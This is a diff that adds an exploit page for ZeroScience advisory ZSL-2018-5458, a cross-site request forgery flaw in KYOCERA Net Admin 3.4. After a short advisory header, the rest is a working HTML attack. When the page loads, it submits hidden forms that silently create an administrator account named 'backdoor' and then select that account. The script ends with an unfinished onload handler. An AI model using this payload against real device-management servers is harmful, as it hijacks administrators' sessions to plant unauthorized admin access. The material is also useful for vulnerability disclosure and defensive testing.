@@ -1,0 +1,83 @@
+#Vendor: KYOCERA Corporation
+#Product https://global.kyocera.com
+#Affected version: 3.4.0906
+#
+#Summary: KYOCERA Net Admin is Kyocera's unified
+#device management software that uses a web-based
+#platform to give network administrators easy and
+#uncomplicated control to handle a fleet for up to
+#10,000 devices. Tasks that used to require multiple
+#programs or walking to each printer can now be
+#accomplished in a single, fast and modern environment.
+#
+#Desc: The application interface allows users to perform
+#certain actions via HTTP requests without performing
+#any validity checks to verify the requests. This can
+#be exploited to perform certain actions with administrative
+#privileges if a logged-in user visits a malicious web
+#site.
+#
+#Tested on: Microsoft Windows 7 Professional SP1 (EN)
+#Apache Tomcat/8.5.15
+#
+#
+#Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#@zeroscience
+#
+#
+#Advisory ID: ZSL-2018-5458
+#Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5458.php
+
+<html>
+<head>
+<title>KYOCERA Net Admin 3.4 CSRF Add Admin Exploit</title>
+</head>
+
+<body onload="exploitrun();">
+
+<!-- Add Administrator -->
+<form name="create_user" action="https://192.168.18.133:7443/fwk-web/jsp/addUser.faces" method="POST" target="frame0">
+ <input type="hidden" name="userType" value="0" />
+ <input type="hidden" name="addUserForm&#58;loginName" value="backdoor" />
+ <input type="hidden" name="addUserForm&#58;pw" value="pass123" />
+ <input type="hidden" name="addUserForm&#58;pwConfirm" value="pass123" />
+ <input type="hidden" name="addUserForm&#58;role" value="administrator" />
+ <input type="hidden" name="addUserForm&#58;required&#95;name" value="name" />
+ <input type="hidden" name="addUserForm&#58;required&#95;email1" value="bd&#64;db&#46;ee" />
+ <input type="hidden" name="addUserForm&#58;required&#95;role" value="administrator" />
+ <input type="hidden" name="addUserForm&#58;optional&#95;name" value="Backdoor" />
+ <input type="hidden" name="addUserForm&#58;company" value="ZSL" />
+ <input type="hidden" name="addUserForm&#58;department" value="forensics" />
+ <input type="hidden" name="addUserForm&#58;email2" value="bd2&#64;db&#46;ee" />
+ <input type="hidden" name="addUserForm&#58;optional&#95;phone" value="123&#45;123&#45;1234" />
+ <input type="hidden" name="addUserForm&#58;optional&#95;cell" value="321&#45;321&#45;3210" />
+ <input type="hidden" name="addUserForm&#58;submitHidden" value="true" />
+ <input type="hidden" name="addUserForm&#95;SUBMIT" value="1" />
+ <input type="hidden" name="addUserForm&#58;&#95;link&#95;hidden&#95;" value="" />
+</form>
+
+<!-- Update Node -->
+<form name="update_node" action="https://192.168.18.133:7443/fwk-web/servlet/EventControllerServlet" method="GET" target="frame1">
+ <input type="hidden" name="bname" value="" />
+ <input type="hidden" name="ts" value="1522690965730" />
+ <input type="hidden" name="cmd" value="tv&#95;set&#95;cur&#95;node" />
+ <input type="hidden" name="node&#95;id" value="root&#46;user&#95;administration&#46;administrator&#46;backdoor" />
+</form>
+
+<iframe name="frame0"></iframe>
+<iframe name="frame1"></iframe>
+
+<script>
+function exploitrun()
+{
+    document.create_user.submit();
+    document.getElementsByTagName("iframe")[0].onload = function()
+    {
+        document.update_node.submit();
+        document.getElementsByTagName("iframe")[1].onload = function()
+    }
+}
+</script>
+
+</body>
+</html>
